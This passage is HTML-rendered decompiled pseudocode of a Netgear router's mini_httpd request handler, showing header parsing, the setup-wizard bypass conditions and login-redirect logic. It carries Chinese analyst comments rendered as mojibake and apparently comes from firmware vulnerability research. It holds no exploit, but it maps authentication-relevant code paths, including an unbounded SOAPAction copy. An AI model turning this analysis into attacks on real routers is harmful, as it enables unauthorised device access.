class="number">1643</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(v10, <span class="string">&quot;read: %s\n&quot;</span>, v178);</span><br><span class="line">        fclose(v10);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_405A40(&amp;dword_42977C, &amp;dword_429774, &amp;dword_429780, v178, v3);</span><br><span class="line">    v11 = dword_42977C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strstr</span>(dword_42977C, <span class="string">&quot;\r\n\r\n&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v11, <span class="string">&quot;\n\n&quot;</span>) );</span><br><span class="line">  v12 = access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v7 = <span class="number">4259840</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v8, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1649</span>);</span><br><span class="line">      v9 = <span class="string">&quot;break on find 2 crlf\n&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  v13 = sub_405720(v7);</span><br><span class="line">  v14 = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">  v15 = <span class="built_in">strpbrk</span>(v13, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  path = v15;</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  path = (v15 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v15 + <span class="number">1</span>, <span class="string">&quot;ptimeout.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !multi_login_flag )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = getppid();</span><br><span class="line">      kill(v17, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = path;</span><br><span class="line">    path = v18 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    v19 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    dword_429740 = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v19 = <span class="number">0</span>;</span><br><span class="line">      dword_429740 = (v19 + <span class="number">1</span>);</span><br><span class="line">      v20 = <span class="number">401</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line">      v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">      v23 = <span class="string">&quot;Authorization required.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_45:</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">LABEL_266:</span><br><span class="line">    v23 = <span class="string">&quot;Can&#x27;t parse request.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = sub_405720(v16);</span><br><span class="line">    <span class="keyword">if</span> ( !v37 || !*v37 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Authorization:&quot;</span>, <span class="number">0xE</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      authorization = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">14</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">14</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Content-Length:&quot;</span>, <span class="number">0xF</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = v37 + <span class="number">15</span>;</span><br><span class="line">      v25 = <span class="built_in">strspn</span>(v24, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_429758 = atol(&amp;v24[v25]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Content-Type:&quot;</span>, <span class="number">0xD</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_429754 = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">13</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42975C = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">7</span>];</span><br><span class="line">      dword_429784 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Host:&quot;</span>, <span class="number">5u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v26 = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">5</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">5</span>];</span><br><span class="line">      host = v26;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>(v26, <span class="number">47</span>) || *v26 == <span class="number">46</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;If-Modified-Since:&quot;</span>, <span class="number">0x12</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v27 = v37 + <span class="number">18</span>;</span><br><span class="line">      v28 = <span class="built_in">strspn</span>(v27, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_429760 = tdate_parse(&amp;v27[v28]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Referer:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ::haystack = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">8</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Referrer:&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ::haystack = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">9</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">9</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;User-Agent:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_429768 = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">11</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">11</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = strncasecmp(v37, <span class="string">&quot;Accept-Language:&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">      v30 = v37;</span><br><span class="line">      <span class="keyword">if</span> ( v29 )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = v37 + <span class="number">11</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !strncasecmp(v30, <span class="string">&quot;SOAPAction:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">        &#123;</span><br><span class="line">          v32 = <span class="built_in">strspn</span>(v31, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">          v33 = strcasestr(&amp;v31[v32], <span class="string">&quot;urn:NETGEAR-ROUTER:service:&quot;</span>);</span><br><span class="line">          v16 = (v33 + <span class="number">27</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              v35 = *v16;</span><br><span class="line">              <span class="keyword">if</span> ( v35 == <span class="number">58</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              *(i + <span class="number">4364168</span>) = v35;</span><br><span class="line">              ++v16;</span><br><span class="line">            &#125;</span><br><span class="line">            v36 = <span class="built_in">strchr</span>(v16, <span class="number">35</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v36 &amp;&amp; v36[<span class="number">1</span>] )</span><br><span class="line">              <span class="built_in">snprintf</span>(&amp;byte_429808, <span class="number">0x80</span>u, <span class="string">&quot;%s&quot;</span>, v36 + <span class="number">1</span>);</span><br><span class="line">            byte_429788[i] = <span class="number">0</span>;</span><br><span class="line">            currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        dword_42976C = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">16</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">16</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( host )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v38 )</span><br><span class="line">      v38 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v38 == <span class="number">98</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_407;</span><br><span class="line">    v39 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v39 )</span><br><span class="line">      v39 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v39 == <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_407:</span><br><span class="line">      <span class="keyword">if</span> ( is_captive_detecting(host, dword_429768) )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_42988C = <span class="number">1</span>;</span><br><span class="line">        dword_429740 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">        v20 = <span class="number">200</span>;</span><br><span class="line">        v21 = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">        v23 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !host &amp;&amp; currentsetting_flag == <span class="number">1</span> )</span><br><span class="line">    host = <span class="string">&quot;www.routerlogin.com&quot;</span>;</span><br><span class="line">  is_usb_session = usb_session_check();</span><br><span class="line">  v40 = <span class="number">1</span>;</span><br><span class="line">  LODWORD(v182) = &amp;host;</span><br><span class="line">  HIDWORD(v182) = host;</span><br><span class="line">  v41 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(HIDWORD(v182), v41) )</span><br><span class="line">    v40 = <span class="built_in">strstr</span>(*v182, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>;</span><br><span class="line">  LODWORD(v182) = <span class="number">4259840</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">49</span> &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v42 )</span><br><span class="line">      v42 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v42 == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v40 || (LODWORD(v182) = host, v43 = getIPAddress(<span class="string">&quot;group1&quot;</span>), !<span class="built_in">strcmp</span>(v182, v43)) )</span><br><span class="line">        v40 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !(v40 | is_usb_session) )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">      v40 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">48</span> &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">49</span> &amp;&amp; *nvram_get(<span class="string">&quot;config_state&quot;</span>) == <span class="number">115</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = is_usb_session;</span><br><span class="line">    <span class="keyword">if</span> ( is_usb_session &amp;&amp; !v40 )</span><br><span class="line">    &#123;</span><br><span class="line">      system(<span class="string">&quot;/bin/echo drop request usb &gt; /dev/console&quot;</span>);</span><br><span class="line">LABEL_97:</span><br><span class="line">      v45 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v44 = is_usb_session;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v44 )</span><br><span class="line">    multi_login_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !check_valid_request() )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">403</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">    v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    v23 = <span class="string">&quot;URL is illegal.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;setupwizard.cgi&quot;</span>) )</span><br><span class="line">    currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( currentsetting_flag == <span class="number">1</span> &amp;&amp; !check_lan_guest() )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie from wan, drop request now &gt; /dev/console&quot;</span>);</span><br><span class="line">    v45 = <span class="number">0</span>;</span><br><span class="line">LABEL_98:</span><br><span class="line">    <span class="built_in">exit</span>(v45);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( currentsetting_flag == <span class="number">1</span> )               <span class="comment">// æ˜¯å®‰è£…å‘å¯¼å°±è¿›å…¥ if</span></span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo it is for setupwizard! &gt;&gt; /tmp/sw.log&quot;</span>);</span><br><span class="line">    LODWORD(v182) = <span class="number">0x430000</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(temp_uri, <span class="string">&quot;/setupwizard.cgi HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">    path = v182 - <span class="number">0x6770</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_429784 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_429A90 = <span class="number">0</span>;</span><br><span class="line">      dword_429A94 = <span class="number">0</span>;</span><br><span class="line">      dword_429A98 = <span class="number">0</span>;</span><br><span class="line">      dword_429A9C = <span class="number">0</span>;</span><br><span class="line">      byte_429AA0 = <span class="number">0</span>;</span><br><span class="line">      v46 = <span class="built_in">strchr</span>(dword_42975C, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v46 )</span><br><span class="line">        strlcpy(&amp;dword_429A90, v46 + <span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dnshj.out&quot;</span>, <span class="number">0</span>) &amp;&amp; (!<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) || !<span class="built_in">strncmp</span>(path, <span class="string">&quot;/ &quot;</span>, <span class="number">2u</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v47 = dword_428518;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_428518 )</span><br><span class="line">        v47 = <span class="string">&quot;indexdnshj.htm&quot;</span>;</span><br><span class="line">      <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/ca/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v47);</span><br><span class="line">      path = temp_uri;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v48 = select_request_type(<span class="number">1</span>);             <span class="comment">// é™¤äº†å®‰è£…å‘å¯¼å’Œ setup çš„è¯·æ±‚èµ°è¿™é‡Œ</span></span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v14, v48) )              <span class="comment">// åˆ¤æ–­æ˜¯ä¸æ˜¯ GET è¯·æ±‚ï¼Ÿ</span></span><br><span class="line">      &#123;</span><br><span class="line">        v49 = path;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v49, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) )<span class="comment">// å¦‚æœ PATH é‡Œé¢æœ‰ .htm æˆ–è€…ç›´æ¥è®¿é—®çš„æ ¹ç›®å½•ï¼Œå°±è¿›å…¥ if</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v182) = host;</span><br><span class="line">          v50 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">          v51 = <span class="built_in">strcmp</span>(v182, v50);</span><br><span class="line">          haystack = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v51 )</span><br><span class="line">            haystack = (<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>);<span class="comment">// ä¸èƒ½å­˜åœ¨ routerlogin</span></span><br><span class="line">          nvram_get(<span class="string">&quot;tm_action_internet&quot;</span>);</span><br><span class="line">          v52 = path;</span><br><span class="line">          stream = <span class="built_in">strstr</span>(path, <span class="string">&quot;traffic_status.htm&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !haystack || (v53 = <span class="built_in">strstr</span>(v52, <span class="string">&quot;_h.htm&quot;</span>) != <span class="number">0</span>, access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>)) &amp;&amp; !v53 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(temp_uri, <span class="string">&quot;/ HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !stream )                      <span class="comment">// URI ä¹Ÿæ²¡æœ‰ traffic_status.htm</span></span><br><span class="line">            &#123;</span><br><span class="line">              v54 = fopen64(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">// æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Ÿ</span></span><br><span class="line">              stream = v54;</span><br><span class="line">              <span class="keyword">if</span> ( v54 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( fgets(v177, <span class="number">99</span>, v54) &amp;&amp; (v55 = <span class="built_in">strstr</span>(v177, <span class="string">&quot;htm&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v55[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                  <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v177);</span><br><span class="line">                  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_block_internet&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    LODWORD(v182) = <span class="number">4259840</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v56 = fopen64(v182 + <span class="number">14864</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v56 )</span><br><span class="line">                        fclose(v56);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  path = temp_uri;</span><br><span class="line">                  login_or_not = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v177, <span class="string">&quot;lan_wan_conflict&quot;</span>) &amp;&amp; !haystack )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, <span class="string">&quot;alert.htm&quot;</span>);</span><br><span class="line">                  path = temp_uri;</span><br><span class="line">                &#125;</span><br><span class="line">                fclose(stream);</span><br><span class="line">                multi_login_flag = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>, <span class="number">0</span>) ) <span class="comment">// å‰ææ˜¯å­˜åœ¨è¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line">  &#123;</span><br><span class="line">    v57 = dword_429768;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(dword_429768, <span class="string">&quot;Genie&quot;</span>) || <span class="built_in">strstr</span>(v57, <span class="string">&quot;LANWizard&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_162;</span><br><span class="line">    v58 = select_request_type(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v14, v58) )                <span class="comment">// å¦‚æœæ˜¯ GET è¯·æ±‚å°±è¿›å…¥ if</span></span><br><span class="line">    &#123;</span><br><span class="line">      v59 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;error-tab-rec.htm&quot;</span>)</span><br><span class="line">        &amp;&amp; (<span class="built_in">strstr</span>(v59, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v59, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) || <span class="built_in">strstr</span>(v59, <span class="string">&quot;.aspx&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          strlcpy(temp_uri, <span class="string">&quot;/setup.cgi?next_file=BRS_wanlan_conflict.html HTTP/1.1\r\n&quot;</span>, <span class="number">512</span>);</span><br><span class="line">          path = temp_uri;</span><br><span class="line">          system(<span class="string">&quot;/bin/cp /proc/uptime /tmp/conflict_warning&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    login_or_not = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;settings.jpg&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/touch /tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v182 = get_uptime(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">    v60 = get_uptime(<span class="string">&quot;/proc/uptime&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( HIDWORD(v60) - HIDWORD(v182) != v60 &lt; v182 || (v60 - v182) &gt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>);</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_162:</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_hijack.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">  v61 = getIPAddress(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">  v62 = host;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(host, <span class="string">&quot;www.msftncsi.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;ncsi.txt&quot;</span>)</span><br><span class="line">    || !<span class="built_in">strcmp</span>(v62, <span class="string">&quot;www.msftconnecttest.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;connecttest.txt&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_429740 = <span class="string">&quot;HTTP/1.0&quot;</span>;</span><br><span class="line">    v20 = <span class="number">404</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Not Found&quot;</span>;</span><br><span class="line">    v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">LABEL_372:</span><br><span class="line">    v23 = <span class="string">&quot;File not found.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  v63 = socket(<span class="number">2</span>, <span class="number">3</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v63 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> (perror)(<span class="string">&quot;socket creating failed&quot;</span>);</span><br><span class="line">  v65 = nvram_get(<span class="string">&quot;wan_ifname&quot;</span>);</span><br><span class="line">  strlcpy(v172, v65, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ioctl(v63, <span class="number">0x8915</span>u, v172) )</span><br><span class="line">  &#123;</span><br><span class="line">    v74 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v74 )</span><br><span class="line">      v74 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span 